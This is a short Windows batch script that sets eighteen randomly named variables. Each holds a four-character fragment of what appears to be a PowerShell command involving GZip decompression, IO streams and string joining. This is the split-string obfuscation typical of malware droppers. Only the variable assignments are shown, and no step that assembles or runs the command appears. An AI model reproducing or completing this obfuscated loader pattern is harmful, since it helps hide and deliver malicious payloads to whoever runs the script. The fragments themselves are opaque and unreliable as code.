@echo off
set "odIvvEBhPW=nirt"
set "zsomOSSwkS=oArr"
set "BhvZjTTDDs=grap"
set "rPzZWlpHvT=bjec"
set "DmyOGwvKbb=Comp"
set "lVEXSWFqIk=oL'["
set "tkUDSkdNZM=MDC."
set "UyIVFvSFBM=REcm"
set "mGobPmXhxx=IO, "
set "ErygBeBkWE=eFe."
set "CvYBIrWbrN=);$q"
set "DVFVhiOZVL=.GZi"
set "ftHPmKjelR=e]::"
set "lkWeQYUtWy=brea"
set "CfaINTFTVG= if "
set "KLhhnylPQf=;$SZ"
set "ewgrmdmUJU=join"
set "kIanuRnLSo=kI.T"
